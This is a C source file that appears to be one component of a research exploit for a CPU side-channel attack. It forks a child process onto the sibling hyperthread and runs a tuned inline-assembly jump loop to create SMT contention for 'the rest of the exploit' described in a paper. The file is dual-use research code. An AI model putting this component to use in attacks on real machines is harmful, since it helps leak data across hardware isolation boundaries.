#include "contention.h"
#ifndef CONTENTION_JNE
#define CONTENTION_JNE 0 // set to 0/1 to loop back via jb/jne
#endif
#ifndef CONTENTION_ALIGN
#define CONTENTION_ALIGN 32 // 0-4095
#endif
#ifndef CONTENTION_N_JE
#define CONTENTION_N_JE 0 // 0-many
#endif
#ifndef CONTENTION_N_JA
#define CONTENTION_N_JA 3 // 0-many
#endif


/*
 * @description: The function containing the contention loop. N.B.: This is highly dependent on the * testbed descriped in the paper and must be adjusted on other machines in order to have the best * contention workload.
 */

__attribute__ ((noinline))  static void do_contention()
{
    pr_info("contention: %u %u %u %u\n", CONTENTION_JNE, CONTENTION_ALIGN, CONTENTION_N_JE, CONTENTION_N_JA);
    asm volatile (
        "xor %%eax, %%eax\n\t"
        ".align 4096\n\t"
        ".rept " STR(CONTENTION_ALIGN) "\n\t"
            "nop\n\t"
        ".endr\n\t"

        "loop:\n\t"
            "cmp $0xf, %%eax\n\t"
            ".rept " STR(CONTENTION_N_JE) "\n\t"
                "je loop\n\t"
            ".endr\n\t"

            ".rept " STR(CONTENTION_N_JA) "\n\t"
                "ja loop\n\t"
            ".endr\n\t"

            ".rept " STR(CONTENTION_JNE) "\n\t"
                "jne loop\n\t"
            ".endr\n\t"

            "jb loop\n\t"
        ::: "eax"
    );
}

/*
 * @description: The function which runs the contention loop. Sets the CPU affinity to the sibling * hyperthread of the core running the rest of the exploit in order to do SMT contention.
 */

static void contention_main()
{
	assert(prctl(PR_SET_PDEATHSIG, SIGTERM) != -1);
	set_cpu_affinity(get_sibling(CPU));
	pr_info("Contention thread is up and running.\n");
	do_contention();
	pr_info("Contention thread is exiting.\n");
	exit(EXIT_SUCCESS);
}

/*
 * @description: The function forks a child process which will run the contention loop effective on 
 * the testbed.
 */

pid_t contention_init()
{
	pid_t pid = fork();
	if (pid == 0)
		contention_main();
    usleep(1000); // Let our sibling spin up.
	return pid;
}
